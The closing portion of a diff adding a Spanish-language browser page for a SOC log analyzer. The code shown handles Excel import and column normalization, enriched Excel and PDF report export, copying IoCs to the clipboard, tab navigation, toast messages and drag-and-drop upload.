+                <div class="pt-6 border-t border-slate-300 flex items-center justify-between text-xs text-slate-500">
+                    <div>Documento generado por <strong>NordicSec SIEM-Analyzer v2.6</strong> • Unidad de Respuesta a Incidentes SOC Nivel 2</div>
+                    <div>${locLabel} • ${reportDate}</div>
+                </div>
+            `;
+        }
+
+        function updateAnalystNameInReport() {
+            const val = document.getElementById("analyst-name-input").value;
+            const target = document.getElementById("report-author-display");
+            if (target) target.textContent = val;
+        }
+
+        function regenerateFullReport() {
+            renderTechnicalReport();
+            showToast("Informe Técnico regenerado con éxito a partir de los hallazgos actuales.", "success");
+        }
+
+        // =====================================================================
+        // 7. IMPORTACIÓN Y EXPORTACIÓN DE ARCHIVOS EXCEL (.XLSX) Y PDF
+        // =====================================================================
+        function handleFileUpload(event) {
+            const file = event.target.files[0];
+            if (!file) return;
+            processUploadedFile(file);
+        }
+
+        function processUploadedFile(file) {
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                try {
+                    const data = new Uint8Array(e.target.result);
+                    const workbook = XLSX.read(data, { type: "array" });
+                    const firstSheetName = workbook.SheetNames[0];
+                    const worksheet = workbook.Sheets[firstSheetName];
+                    const jsonRows = XLSX.utils.sheet_to_json(worksheet, { defval: "" });
+
+                    if (!jsonRows || jsonRows.length === 0) {
+                        showToast("El archivo Excel está vacío o no contiene filas válidas.", "error");
+                        return;
+                    }
+
+                    // Normalizar nombres de columnas flexibles para admitir cualquier Excel de SIEM
+                    rawLogs = jsonRows.map(row => normalizeExcelRow(row));
+                    currentDatasetName = file.name;
+                    document.getElementById("header-dataset-name").textContent = `Dataset: ${file.name}`;
+
+                    analyzeSIEMLogs(rawLogs);
+                    showToast(`Archivo '${file.name}' importado y analizado (${rawLogs.length} eventos).`, "success");
+                } catch (err) {
+                    console.error(err);
+                    showToast("Error al procesar el archivo Excel. Verifique que sea un archivo .xlsx o .csv válido.", "error");
+                }
+            };
+            reader.readAsArrayBuffer(file);
+        }
+
+        function normalizeExcelRow(r) {
+            const findVal = (keys) => {
+                for (const k of Object.keys(r)) {
+                    const clean = k.toLowerCase().trim();
+                    if (keys.some(candidate => clean.includes(candidate))) {
+                        return r[k];
+                    }
+                }
+                return "";
+            };
+
+            return {
+                Timestamp: findVal(["timestamp", "fecha", "hora", "time", "date"]) || "2026-10-26 02:00:00",
+                EventID: String(findVal(["eventid", "id", "codigo", "code", "evento_id"]) || "4688"),
+                Host: findVal(["host", "equipo", "servidor", "computer", "hostname", "maquina"]) || "STHLM-SRV-01",
+                User: findVal(["user", "usuario", "account", "cuenta"]) || "unknown_user",
+                SourceIP: findVal(["sourceip", "ip_origen", "src_ip", "src", "origen", "source"]) || "10.20.1.10",
+                DestIP: findVal(["destip", "ip_destino", "dst_ip", "dst", "destino", "destination"]) || "10.20.0.10",
+                Action: findVal(["action", "accion", "event", "evento", "tipo", "category"]) || "Security Event",
+                Command: findVal(["command", "comando", "process", "proceso", "cmdline", "ejecucion"]) || "-",
+                Details: findVal(["details", "detalle", "descripcion", "message", "mensaje", "log"]) || ""
+            };
+        }
+
+        // Descargar un archivo Excel (.xlsx) real con los logs del caso Estocolmo para probar la subida
+        function downloadSampleExcel() {
+            try {
+                const sampleData = getStockholmDefaultLogs();
+                const ws = XLSX.utils.json_to_sheet(sampleData);
+                const wb = XLSX.utils.book_new();
+                XLSX.utils.book_append_sheet(wb, ws, "Logs_SIEM_Estocolmo");
+                XLSX.writeFile(wb, "Logs_SIEM_Cliente_Estocolmo.xlsx");
+                showToast("Archivo 'Logs_SIEM_Cliente_Estocolmo.xlsx' descargado correctamente.", "success");
+            } catch (e) {
+                showToast("No se pudo generar el archivo Excel.", "error");
+            }
+        }
+
+        // Exportar Excel enriquecido con resultados del análisis SOC Nivel 2
+        function exportEnrichedExcel() {
+            try {
+                const cleanLogs = analyzedLogs.map(l => ({
+                    ID: l.id,
+                    Timestamp: l.Timestamp,
+                    EventID: l.EventID,
+                    Host: l.Host,
+                    Usuario: l.User,
+                    IP_Origen: l.SourceIP,
+                    IP_Destino: l.DestIP,
+                    Accion: l.Action,
+                    Comando_Proceso: l.Command,
+                    Categoria_Detectada: l.category,
+                    Nivel_Riesgo: l.severity,
+                    MITRE_ATTACK: l.mitre,
+                    Explicacion_SOC: l.explanation
+                }));
+
+                const findingsSheet = securityFindings.map(f => ({
+                    ID_Hallazgo: f.id,
+                    Categoria: f.category,
+                    MITRE: f.mitre,
+                    Eventos_Asociados: f.count,
+                    Criticidad: f.severity,
+                    CVSS: f.cvss,
+                    Justificacion: f.justification,
+                    Explicacion_Tecnica: f.technicalExplanation
+                }));
+
+                const wb = XLSX.utils.book_new();
+                const ws1 = XLSX.utils.json_to_sheet(cleanLogs);
+                const ws2 = XLSX.utils.json_to_sheet(findingsSheet);
+                XLSX.utils.book_append_sheet(wb, ws1, "Logs_Analizados_SOC");
+                XLSX.utils.book_append_sheet(wb, ws2, "Clasificacion_Riesgos");
+                XLSX.writeFile(wb, `Analisis_SOC_Nivel2_${missionSlug()}.xlsx`);
+                showToast("Excel enriquecido descargado con éxito.", "success");
+            } catch (e) {
+                showToast("Error al exportar el Excel analizado.", "error");
+            }
+        }
+
+        // Exportación del Informe Técnico a PDF usando html2pdf.js
+        function exportReportToPDF() {
+            // Asegurarnos de que el informe esté actualizado
+            const reportElement = document.getElementById("printable-report");
+            if (!reportElement) return;
+
+            showToast("Generando documento PDF del Informe Técnico SOC...", "info");
+
+            const opt = {
+                margin: [8, 8, 8, 8],
+                filename: `Informe_Tecnico_SOC_Nivel2_${missionSlug()}.pdf`,
+                image: { type: "jpeg", quality: 0.98 },
+                html2canvas: { scale: 2, useCORS: true, backgroundColor: "#ffffff" },
+                jsPDF: { unit: "mm", format: "a4", orientation: "portrait" },
+                pagebreak: { mode: ["avoid-all", "css", "legacy"] }
+            };
+
+            // Si estamos en otra pestaña, mostramos temporalmente la pestaña de reporte para que html2canvas capture bien el DOM
+            const reportTab = document.getElementById("tab-report");
+            const wasHidden = reportTab.classList.contains("hidden");
+            if (wasHidden) {
+                reportTab.classList.remove("hidden");
+            }
+
+            html2pdf().set(opt).from(reportElement).save().then(() => {
+                if (wasHidden) {
+                    reportTab.classList.add("hidden");
+                }
+                showToast("Informe Técnico descargado en PDF correctamente.", "success");
+            }).catch(err => {
+                if (wasHidden) {
+                    reportTab.classList.add("hidden");
+                }
+                console.error(err);
+                showToast("Usando motor de impresión PDF alternativo...", "info");
+                printReportNative();
+            });
+        }
+
+        function printReportNative() {
+            switchTab("tab-report");
+            setTimeout(() => {
+                window.print();
+            }, 300);
+        }
+
+        // Copiar IoCs al portapapeles
+        function copyIoCsToClipboard() {
+            const text = [
+                `=== INDICADORES DE COMPROMISO (IoC) - ${currentMission.isDefault ? "CASO ESTOCOLMO" : currentMission.company.toUpperCase()} ===`,
+                "IPs / Dominios: " + extractedIoCs.ips.join(", "),
+                "Usuarios: " + extractedIoCs.users.join(", "),
+                "Hosts: " + extractedIoCs.hosts.join(", "),
+                "Comandos: " + extractedIoCs.commands.join(" | ")
+            ].join("\n");
+
+            const textarea = document.createElement("textarea");
+            textarea.value = text;
+            document.body.appendChild(textarea);
+            textarea.select();
+            document.execCommand("copy");
+            document.body.removeChild(textarea);
+            showToast("Indicadores de Compromiso (IoCs) copiados al portapapeles.", "success");
+        }
+
+        // =====================================================================
+        // 8. NAVEGACIÓN DE PESTAÑAS, DRAG & DROP Y UTILIDADES
+        // =====================================================================
+        function switchTab(tabId) {
+            document.querySelectorAll(".tab-content").forEach(el => el.classList.add("hidden"));
+            const target = document.getElementById(tabId);
+            if (target) target.classList.remove("hidden");
+
+            document.querySelectorAll(".tab-btn").forEach(btn => {
+                btn.className = "tab-btn flex items-center gap-2 px-3.5 py-2 rounded-xl text-xs sm:text-sm font-medium transition whitespace-nowrap text-slate-400 hover:text-white hover:bg-slate-800/60";
+            });
+
+            const activeBtn = document.getElementById("btn-" + tabId);
+            if (activeBtn) {
+                activeBtn.className = "tab-btn flex items-center gap-2 px-3.5 py-2 rounded-xl text-xs sm:text-sm font-semibold transition whitespace-nowrap bg-cyan-500/15 text-cyan-300 border border-cyan-500/30 shadow-sm";
+            }
+
+            if (tabId === "tab-dashboard") {
+                setTimeout(() => updateDashboardCharts(), 60);
+            }
+        }
+
+        function toggleMissionModal() {
+            const modal = document.getElementById("mission-modal");
+            if (modal.classList.contains("hidden")) {
+                modal.classList.remove("hidden");
+                modal.classList.add("flex");
+            } else {
+                modal.classList.add("hidden");
+                modal.classList.remove("flex");
+            }
+        }
+
+        function loadStockholmDataset() {
+            rawLogs = getStockholmDefaultLogs();
+            currentDatasetName = "Caso_Estocolmo_SIEM.xlsx";
+            document.getElementById("header-dataset-name").textContent = `Dataset: ${currentDatasetName}`;
+            analyzeSIEMLogs(rawLogs);
+            showToast("Dataset 'Caso Estocolmo' cargado y correlacionado.", "success");
+        }
+
+        function showToast(message, type = "info") {
+            const container = document.getElementById("toast-container");
+            const colors = {
+                success: "border-emerald-500/50 bg-slate-900/95 text-emerald-300",
+                error: "border-red-500/50 bg-slate-900/95 text-red-300",
+                info: "border-cyan-500/50 bg-slate-900/95 text-cyan-300"
+            };
+            const el = document.createElement("div");
+            el.className = `pointer-events-auto border ${colors[type] || colors.info} px-4 py-3 rounded-xl shadow-xl text-xs font-medium flex items-center justify-between gap-3 transition-all duration-300`;
+            el.innerHTML = `<span>${escapeHtml(message)}</span>`;
+            container.appendChild(el);
+            setTimeout(() => {
+                el.style.opacity = "0";
+                setTimeout(() => el.remove(), 300);
+            }, 3500);
+        }
+
+        function escapeHtml(str) {
+            return String(str ?? "")
+                .replace(/&/g, "&amp;")
+                .replace(/</g, "&lt;")
+                .replace(/>/g, "&gt;")
+                .replace(/"/g, "&quot;")
+                .replace(/'/g, "&#039;");
+        }
+
+        // Configurar Drag & Drop en la zona de carga
+        function setupDragAndDrop() {
+            const dropZone = document.getElementById("drop-zone");
+            if (!dropZone) return;
+
+            ["dragenter", "dragover", "dragleave", "drop"].forEach(evtName => {
+                dropZone.addEventListener(evtName, e => {
+                    e.preventDefault();
+                    e.stopPropagation();
+                });
+            });
+
+            ["dragenter", "dragover"].forEach(evtName => {
+                dropZone.addEventListener(evtName, () => {
+                    dropZone.classList.add("border-cyan-400", "bg-cyan-950/20");
+                });
+            });
+
+            ["dragleave", "drop"].forEach(evtName => {
+                dropZone.addEventListener(evtName, () => {
+                    dropZone.classList.remove("border-cyan-400", "bg-cyan-950/20");
+                });
+            });
+
+            dropZone.addEventListener("drop", e => {
+                const files = e.dataTransfer.files;
+                if (files && files.length > 0) {
+                    processUploadedFile(files[0]);
+                }
+            });
+        }
+
+        // Inicialización al cargar la página
+        window.onload = function() {
+            lucide.createIcons();
+            setupDragAndDrop();
+            switchTab("tab-upload");
+            try { savedMissions = JSON.parse(storageGet("soc_missions_v1") || "[]"); } catch (e) { savedMissions = []; }
+            const activeId = storageGet("soc_active_mission");
+            if (activeId && savedMissions.some(m => m.id === activeId)) {
+                activateMission(activeId);
+            } else {
+                applyMissionToUI();
+                loadStockholmDataset();
+            }
+        };
+    </script>
+</body>
+</html>
